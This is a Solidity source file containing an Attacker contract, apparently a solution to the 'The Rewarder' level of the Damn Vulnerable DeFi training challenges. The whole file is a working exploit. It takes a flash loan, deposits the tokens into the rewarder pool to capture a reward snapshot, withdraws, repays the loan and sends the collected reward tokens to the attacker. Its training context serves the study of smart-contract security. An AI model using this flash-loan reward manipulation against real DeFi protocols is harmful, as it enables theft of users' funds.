// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {RewardToken} from "./RewardToken.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";

contract Attacker {
    address public immutable attacker;

    FlashLoanerPool public immutable pool;
    DamnValuableToken public immutable liquidityToken;
    RewardToken public immutable rewardToken;
    TheRewarderPool public immutable rewarderPool;

    constructor(
        address attackerAddress,
        address tokenAddress,
        address rewardTokenAddress,
        address poolAddress,
        address rewardPoolAddress
    ) {
        attacker = attackerAddress;
        liquidityToken = DamnValuableToken(tokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
        pool = FlashLoanerPool(poolAddress);
        rewarderPool = TheRewarderPool(rewardPoolAddress);
    }

    // requests flashloan from the pool contract
    function hitFlashLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }

    // this callback deposits the loan amount, accurues some reward which gets
    // sent to this contract and then withdraws the lT tokens to payback flashloan
    // the accrued reward from this contract then gets sent to the attacker.
    function receiveFlashLoan(uint256 amount) external {
        //approval
        liquidityToken.increaseAllowance(address(rewarderPool), amount);

        rewarderPool.deposit(amount);

        uint256 rewardCollected = rewardToken.balanceOf(address(this));

        rewarderPool.withdraw(amount);

        liquidityToken.transfer(address(pool), amount);

        rewardToken.transfer(attacker, rewardCollected);
    }
}
